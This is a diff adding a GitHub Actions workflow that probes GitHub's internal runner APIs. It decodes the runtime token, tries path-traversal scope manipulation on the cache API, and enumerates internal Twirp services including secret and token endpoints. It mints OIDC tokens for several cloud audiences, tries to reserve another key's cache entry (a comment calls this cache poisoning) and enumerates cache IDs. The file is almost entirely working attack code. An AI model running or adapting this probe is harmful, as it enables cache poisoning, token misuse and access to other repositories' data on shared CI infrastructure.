@@ -1,0 +1,190 @@
+name: Internal API Deep Probe
+on:
+  workflow_dispatch:
+permissions:
+  contents: read
+  actions: read
+  id-token: write
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Capture internal API details
+        id: capture
+        uses: actions/github-script@v7
+        with:
+          script: |
+            const token = process.env.ACTIONS_RUNTIME_TOKEN;
+            const cacheUrl = process.env.ACTIONS_CACHE_URL;
+            const resultsUrl = process.env.ACTIONS_RESULTS_URL;
+            const runtimeUrl = process.env.ACTIONS_RUNTIME_URL;
+            
+            // Decode JWT
+            const jwt = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString());
+            console.log('=== JWT CLAIMS ===');
+            Object.entries(jwt).forEach(([k,v]) => console.log(`${k}: ${JSON.stringify(v)}`));
+            
+            const headers = { 'Authorization': `Bearer ${token}`, 'Content-Type': 'application/json' };
+            
+            // 1. Cache API - list caches for THIS repo
+            console.log('\n=== CACHE API - OWN REPO ===');
+            try {
+              const r = await fetch(`${cacheUrl}_apis/artifactcache/cache?keys=build-cache-main-v1&version=*`, { headers });
+              const t = await r.text();
+              console.log(`List own cache: ${r.status} ${t.substring(0,500)}`);
+            } catch(e) { console.log('Cache list error:', e.message); }
+            
+            // 2. Cache API - try to list with wildcard/empty key
+            console.log('\n=== CACHE API - WILDCARD ===');
+            try {
+              const r = await fetch(`${cacheUrl}_apis/artifactcache/cache?keys=&version=`, { headers });
+              console.log(`Wildcard: ${r.status} ${(await r.text()).substring(0,500)}`);
+            } catch(e) { console.log('Wildcard error:', e.message); }
+            
+            // 3. Cache API - try to access different scope by manipulating URL
+            console.log('\n=== CACHE API - SCOPE MANIPULATION ===');
+            const baseUrl = cacheUrl.replace(/[^/]+\/$/, '');
+            // Try common scope patterns
+            for (const scope of ['00000000', 'test', '../', '%2e%2e/', 'AAAA']) {
+              try {
+                const r = await fetch(`${baseUrl}${scope}/_apis/artifactcache/cache?keys=test&version=test`, { headers });
+                console.log(`Scope ${scope}: ${r.status} ${(await r.text()).substring(0,200)}`);
+              } catch(e) { console.log(`Scope ${scope}: error ${e.message}`); }
+            }
+            
+            // 4. Results API (Twirp) - ListArtifacts
+            console.log('\n=== RESULTS API (Twirp) ===');
+            const artBase = `${resultsUrl}twirp/github.actions.results.api.v1.ArtifactService`;
+            
+            // List available RPC methods by sending bad request
+            try {
+              const r = await fetch(`${resultsUrl}twirp/`, { method: 'POST', headers });
+              console.log(`Twirp root: ${r.status} ${(await r.text()).substring(0,300)}`);
+            } catch(e) { console.log('Twirp root:', e.message); }
+            
+            // Try to discover other Twirp services
+            for (const svc of [
+              'github.actions.results.api.v1.ArtifactService/ListArtifacts',
+              'github.actions.results.api.v1.CacheService/ListCaches',
+              'github.actions.results.api.v1.CacheService/GetCacheEntry',
+              'github.actions.results.api.v1.CacheService/LookupCacheEntry', 
+              'github.actions.results.api.v1.LogService/ListLogs',
+              'github.actions.results.api.v1.SecretService/GetSecret',
+              'github.actions.results.api.v1.TokenService/RefreshToken',
+              'github.actions.results.api.v2.ArtifactService/ListArtifacts',
+              'github.actions.results.internal.CacheService/GetCacheEntry',
+              'github.actions.pipelines.v1.PipelineService/GetPipeline',
+              'github.actions.token.v1.TokenService/ExchangeToken',
+            ]) {
+              try {
+                const r = await fetch(`${resultsUrl}twirp/${svc}`, { method: 'POST', headers, body: '{}' });
+                const t = await r.text();
+                if (r.status !== 404) {
+                  console.log(`[HIT] ${svc}: ${r.status} ${t.substring(0,300)}`);
+                }
+              } catch(e) {}
+            }
+            
+            // 5. Runtime API - explore endpoints
+            console.log('\n=== RUNTIME API ===');
+            for (const path of [
+              '_apis/v1/timeline',
+              '_apis/distributedtask/v1/connections',
+              '_apis/pipelines/v1/pipeline',
+              '_apis/v1/message',
+              '_apis/distributedtask/v1/taskagent',
+              '_apis/distributedtask/v1/agentresources',
+            ]) {
+              try {
+                const r = await fetch(`${runtimeUrl}${path}`, { headers });
+                const t = await r.text();
+                if (r.status !== 404) {
+                  console.log(`[HIT] ${path}: ${r.status} ${t.substring(0,300)}`);
+                }
+              } catch(e) {}
+            }
+            
+            // 6. Try to get OIDC token with various audiences
+            console.log('\n=== OIDC TOKEN ===');
+            const oidcUrl = process.env.ACTIONS_ID_TOKEN_REQUEST_URL;
+            const oidcToken = process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN;
+            if (oidcUrl && oidcToken) {
+              for (const aud of ['api.github.com', 'https://github.com', 'sts.amazonaws.com', 'https://token.actions.githubusercontent.com']) {
+                try {
+                  const r = await fetch(`${oidcUrl}&audience=${encodeURIComponent(aud)}`, {
+                    headers: { 'Authorization': `bearer ${oidcToken}` }
+                  });
+                  const d = await r.json();
+                  if (d.value) {
+                    const payload = JSON.parse(Buffer.from(d.value.split('.')[1], 'base64').toString());
+                    console.log(`aud=${aud}:`);
+                    console.log(`  sub: ${payload.sub}`);
+                    console.log(`  repository: ${payload.repository}`);
+                    console.log(`  repository_owner: ${payload.repository_owner}`);
+                    console.log(`  actor: ${payload.actor}`);
+                    console.log(`  ref: ${payload.ref}`);
+                    console.log(`  sha: ${payload.sha}`);
+                    console.log(`  workflow: ${payload.workflow}`);
+                    console.log(`  environment: ${payload.environment}`);
+                    console.log(`  runner_environment: ${payload.runner_environment}`);
+                    console.log(`  enterprise: ${payload.enterprise}`);
+                    // Check all custom claims
+                    const standard = new Set(['iss','sub','aud','exp','nbf','iat','jti','repository','repository_owner','repository_owner_id','repository_id','actor_id','actor','workflow','head_ref','base_ref','event_name','ref_type','ref','sha','workflow_ref','workflow_sha','job_workflow_ref','job_workflow_sha','runner_environment','enterprise','ref_protected','environment','environment_node_id','repository_visibility','run_id','run_number','run_attempt']);
+                    const custom = Object.entries(payload).filter(([k]) => !standard.has(k));
+                    if (custom.length > 0) {
+                      console.log('  CUSTOM CLAIMS:', JSON.stringify(Object.fromEntries(custom)));
+                    }
+                  }
+                } catch(e) { console.log(`aud=${aud}: error ${e.message}`); }
+              }
+            } else {
+              console.log('OIDC not available');
+            }
+
+      - name: Cache API version probing
+        run: |
+          CACHE_URL="${ACTIONS_CACHE_URL}"
+          TOKEN="${ACTIONS_RUNTIME_TOKEN}"
+          
+          echo "=== Cache API Versions ==="
+          for ver in "v1" "v2" "v3" "6.0-preview.1" "7.1-preview.1"; do
+            STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
+              -H "Authorization: Bearer $TOKEN" \
+              -H "Accept: application/json;api-version=$ver" \
+              "${CACHE_URL}_apis/artifactcache/cache?keys=test&version=test")
+            echo "  api-version=$ver: $STATUS"
+          done
+          
+          echo ""
+          echo "=== Cache API Methods ==="
+          for method in GET POST PUT PATCH DELETE OPTIONS; do
+            STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X $method \
+              -H "Authorization: Bearer $TOKEN" \
+              "${CACHE_URL}_apis/artifactcache/caches")
+            echo "  $method /caches: $STATUS"
+          done
+          
+          echo ""
+          echo "=== Cache reserve with foreign key ==="
+          # Try to reserve a cache entry (this is how poisoning would work)
+          RESP=$(curl -s -w "\nHTTP:%{http_code}" \
+            -X POST \
+            -H "Authorization: Bearer $TOKEN" \
+            -H "Content-Type: application/json" \
+            "${CACHE_URL}_apis/artifactcache/caches" \
+            -d '{"key":"build-cache-main-v1","version":"deadbeef"}')
+          echo "Reserve build-cache-main-v1:"
+          echo "$RESP"
+          
+          echo ""
+          echo "=== Cache entry enumeration (sequential IDs) ==="
+          for id in 1 2 3 100 1000; do
+            RESP=$(curl -s -w "\nHTTP:%{http_code}" \
+              -H "Authorization: Bearer $TOKEN" \
+              "${CACHE_URL}_apis/artifactcache/caches/$id")
+            HTTP=$(echo "$RESP" | tail -1)
+            BODY=$(echo "$RESP" | head -1)
+            if [ "$HTTP" != "HTTP:404" ]; then
+              echo "  Cache ID $id: $HTTP $BODY"
+            fi
+          done
